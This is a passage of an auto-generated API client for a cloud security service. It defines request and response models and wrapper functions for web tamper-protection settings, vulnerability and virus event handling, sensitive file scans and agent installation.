    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulWhitelistTarget(request: ModifyVulWhitelistTargetRequest): ModifyVulWhitelistTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulWhitelistTargetWithOptions(request, runtime);
}

model ModifyWebLockCreateConfigRequest {
  defenceMode?: string(name='DefenceMode'),
  dir?: string(name='Dir'),
  exclusiveDir?: string(name='ExclusiveDir'),
  exclusiveFile?: string(name='ExclusiveFile'),
  exclusiveFileType?: string(name='ExclusiveFileType'),
  inclusiveFile?: string(name='InclusiveFile'),
  inclusiveFileType?: string(name='InclusiveFileType'),
  lang?: string(name='Lang'),
  localBackupDir?: string(name='LocalBackupDir'),
  mode?: string(name='Mode'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockCreateConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockCreateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockCreateConfigResponseBody(name='body'),
}

async function modifyWebLockCreateConfigWithOptions(request: ModifyWebLockCreateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockCreateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockCreateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockCreateConfig(request: ModifyWebLockCreateConfigRequest): ModifyWebLockCreateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockCreateConfigWithOptions(request, runtime);
}

model ModifyWebLockDeleteConfigRequest {
  id?: int32(name='Id'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockDeleteConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockDeleteConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockDeleteConfigResponseBody(name='body'),
}

async function modifyWebLockDeleteConfigWithOptions(request: ModifyWebLockDeleteConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockDeleteConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockDeleteConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockDeleteConfig(request: ModifyWebLockDeleteConfigRequest): ModifyWebLockDeleteConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockDeleteConfigWithOptions(request, runtime);
}

model ModifyWebLockProcessStatusRequest {
  dealAll?: int32(name='DealAll'),
  operateInfo?: string(name='OperateInfo'),
  processPath?: [ string ](name='ProcessPath'),
  status?: int32(name='Status'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockProcessStatusResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockProcessStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockProcessStatusResponseBody(name='body'),
}

async function modifyWebLockProcessStatusWithOptions(request: ModifyWebLockProcessStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockProcessStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.operateInfo)) {
    query['OperateInfo'] = request.operateInfo;
  }
  if (!Util.isUnset(request.processPath)) {
    query['ProcessPath'] = request.processPath;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockProcessStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockProcessStatus(request: ModifyWebLockProcessStatusRequest): ModifyWebLockProcessStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockProcessStatusWithOptions(request, runtime);
}

model ModifyWebLockStartRequest {
  defenceMode?: string(name='DefenceMode'),
  dir?: string(name='Dir'),
  exclusiveDir?: string(name='ExclusiveDir'),
  exclusiveFile?: string(name='ExclusiveFile'),
  exclusiveFileType?: string(name='ExclusiveFileType'),
  inclusiveFileType?: string(name='InclusiveFileType'),
  localBackupDir?: string(name='LocalBackupDir'),
  mode?: string(name='Mode'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockStartResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockStartResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStartResponseBody(name='body'),
}

async function modifyWebLockStartWithOptions(request: ModifyWebLockStartRequest, runtime: Util.RuntimeOptions): ModifyWebLockStartResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStart',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockStart(request: ModifyWebLockStartRequest): ModifyWebLockStartResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStartWithOptions(request, runtime);
}

model ModifyWebLockStatusRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockStatusResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStatusResponseBody(name='body'),
}

async function modifyWebLockStatusWithOptions(request: ModifyWebLockStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockStatus(request: ModifyWebLockStatusRequest): ModifyWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStatusWithOptions(request, runtime);
}

model ModifyWebLockUnbindRequest {
  uuid?: string(name='Uuid'),
}

model ModifyWebLockUnbindResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockUnbindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUnbindResponseBody(name='body'),
}

async function modifyWebLockUnbindWithOptions(request: ModifyWebLockUnbindRequest, runtime: Util.RuntimeOptions): ModifyWebLockUnbindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUnbind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockUnbind(request: ModifyWebLockUnbindRequest): ModifyWebLockUnbindResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUnbindWithOptions(request, runtime);
}

model ModifyWebLockUpdateConfigRequest {
  defenceMode?: string(name='DefenceMode'),
  dir?: string(name='Dir'),
  exclusiveDir?: string(name='ExclusiveDir'),
  exclusiveFile?: string(name='ExclusiveFile'),
  exclusiveFileType?: string(name='ExclusiveFileType'),
  id?: int32(name='Id'),
  inclusiveFile?: string(name='InclusiveFile'),
  inclusiveFileType?: string(name='InclusiveFileType'),
  lang?: string(name='Lang'),
  localBackupDir?: string(name='LocalBackupDir'),
  mode?: string(name='Mode'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model ModifyWebLockUpdateConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyWebLockUpdateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUpdateConfigResponseBody(name='body'),
}

async function modifyWebLockUpdateConfigWithOptions(request: ModifyWebLockUpdateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockUpdateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUpdateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockUpdateConfig(request: ModifyWebLockUpdateConfigRequest): ModifyWebLockUpdateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUpdateConfigWithOptions(request, runtime);
}

model ModifyWebPathRequest {
  config?: string(name='Config'),
  target?: string(name='Target'),
  type?: string(name='Type'),
}

model ModifyWebPathResponseBody = {
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ModifyWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebPathResponseBody(name='body'),
}

async function modifyWebPathWithOptions(request: ModifyWebPathRequest, runtime: Util.RuntimeOptions): ModifyWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebPath(request: ModifyWebPathRequest): ModifyWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebPathWithOptions(request, runtime);
}

model OpenSensitiveFileScanRequest {
  switchOn?: string(name='SwitchOn'),
}

model OpenSensitiveFileScanResponseBody = {
  code?: string(name='Code'),
  data?: {
    switchOn?: string(name='SwitchOn'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model OpenSensitiveFileScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OpenSensitiveFileScanResponseBody(name='body'),
}

async function openSensitiveFileScanWithOptions(request: OpenSensitiveFileScanRequest, runtime: Util.RuntimeOptions): OpenSensitiveFileScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OpenSensitiveFileScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function openSensitiveFileScan(request: OpenSensitiveFileScanRequest): OpenSensitiveFileScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return openSensitiveFileScanWithOptions(request, runtime);
}

model OperateAgentClientInstallRequest {
  instanceIds?: string(name='InstanceIds'),
  lang?: string(name='Lang'),
  uuids?: string(name='Uuids'),
}

model OperateAgentClientInstallResponseBody = {
  aegisCelintInstallResposeList?: [ 
    {
      instanceId?: string(name='InstanceId'),
      recordId?: long(name='RecordId'),
      uuid?: string(name='Uuid'),
    }
  ](name='AegisCelintInstallResposeList'),
  requestId?: string(name='RequestId'),
}

model OperateAgentClientInstallResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateAgentClientInstallResponseBody(name='body'),
}

async function operateAgentClientInstallWithOptions(request: OperateAgentClientInstallRequest, runtime: Util.RuntimeOptions): OperateAgentClientInstallResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateAgentClientInstall',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateAgentClientInstall(request: OperateAgentClientInstallRequest): OperateAgentClientInstallResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateAgentClientInstallWithOptions(request, runtime);
}

model OperateCommonOverallConfigRequest {
  config?: string(name='Config'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model OperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonOverallConfigResponseBody(name='body'),
}

async function operateCommonOverallConfigWithOptions(request: OperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): OperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateCommonOverallConfig(request: OperateCommonOverallConfigRequest): OperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonOverallConfigWithOptions(request, runtime);
}

model OperateCommonTargetConfigRequest {
  fieldName?: string(name='FieldName'),
  fieldValue?: string(name='FieldValue'),
  sourceIp?: string(name='SourceIp'),
  targetOperations?: string(name='TargetOperations'),
  targetType?: string(name='TargetType'),
  type?: string(name='Type'),
}

model OperateCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonTargetConfigResponseBody(name='body'),
}

async function operateCommonTargetConfigWithOptions(request: OperateCommonTargetConfigRequest, runtime: Util.RuntimeOptions): OperateCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateCommonTargetConfig(request: OperateCommonTargetConfigRequest): OperateCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonTargetConfigWithOptions(request, runtime);
}

model OperateImageBaselineWhitelistRequest {
  baselineItemKeyList?: string(name='BaselineItemKeyList'),
  imageUuid?: string(name='ImageUuid'),
  lang?: string(name='Lang'),
  operation?: string(name='Operation'),
  scanRange?: [ string ](name='ScanRange'),
}

model OperateImageBaselineWhitelistResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateImageBaselineWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageBaselineWhitelistResponseBody(name='body'),
}

async function operateImageBaselineWhitelistWithOptions(request: OperateImageBaselineWhitelistRequest, runtime: Util.RuntimeOptions): OperateImageBaselineWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKeyList)) {
    query['BaselineItemKeyList'] = request.baselineItemKeyList;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageBaselineWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateImageBaselineWhitelist(request: OperateImageBaselineWhitelistRequest): OperateImageBaselineWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageBaselineWhitelistWithOptions(request, runtime);
}

model OperateImageVulRequest {
  info?: string(name='Info'),
  operateType?: string(name='OperateType'),
  type?: string(name='Type'),
}

model OperateImageVulResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateImageVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageVulResponseBody(name='body'),
}

async function operateImageVulWithOptions(request: OperateImageVulRequest, runtime: Util.RuntimeOptions): OperateImageVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateImageVul(request: OperateImageVulRequest): OperateImageVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageVulWithOptions(request, runtime);
}

model OperateSuspiciousOverallConfigRequest {
  config?: string(name='Config'),
  lang?: string(name='Lang'),
  noTargetAsOn?: boolean(name='NoTargetAsOn'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model OperateSuspiciousOverallConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousOverallConfigResponseBody(name='body'),
}

async function operateSuspiciousOverallConfigWithOptions(request: OperateSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.noTargetAsOn)) {
    query['NoTargetAsOn'] = request.noTargetAsOn;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateSuspiciousOverallConfig(request: OperateSuspiciousOverallConfigRequest): OperateSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousOverallConfigWithOptions(request, runtime);
}

model OperateSuspiciousTargetConfigRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  targetOperations?: string(name='TargetOperations'),
  targetType?: string(name='TargetType'),
  type?: string(name='Type'),
}

model OperateSuspiciousTargetConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateSuspiciousTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousTargetConfigResponseBody(name='body'),
}

async function operateSuspiciousTargetConfigWithOptions(request: OperateSuspiciousTargetConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateSuspiciousTargetConfig(request: OperateSuspiciousTargetConfigRequest): OperateSuspiciousTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousTargetConfigWithOptions(request, runtime);
}

model OperateVirusEventsRequest {
  operationAll?: int32(name='OperationAll'),
  operationCode?: string(name='OperationCode'),
  operationRange?: string(name='OperationRange'),
}

model OperateVirusEventsResponseBody = {
  requestId?: string(name='RequestId'),
  taskId?: long(name='TaskId'),
}

model OperateVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVirusEventsResponseBody(name='body'),
}

async function operateVirusEventsWithOptions(request: OperateVirusEventsRequest, runtime: Util.RuntimeOptions): OperateVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateVirusEvents(request: OperateVirusEventsRequest): OperateVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVirusEventsWithOptions(request, runtime);
}

model OperateVulsRequest {
  operateType?: string(name='OperateType'),
  type?: string(name='Type'),
  uuids?: [ string ](name='Uuids'),
  vulNames?: [ string ](name='VulNames'),
}

model OperateVulsResponseBody = {
  requestId?: string(name='RequestId'),
}

model OperateVulsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVulsResponseBody(name='body'),
}

async function operateVulsWithOptions(request: OperateVulsRequest, runtime: Util.RuntimeOptions): OperateVulsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVuls',
    version = '2018-12-03',
    protocol = 'HTTPS',
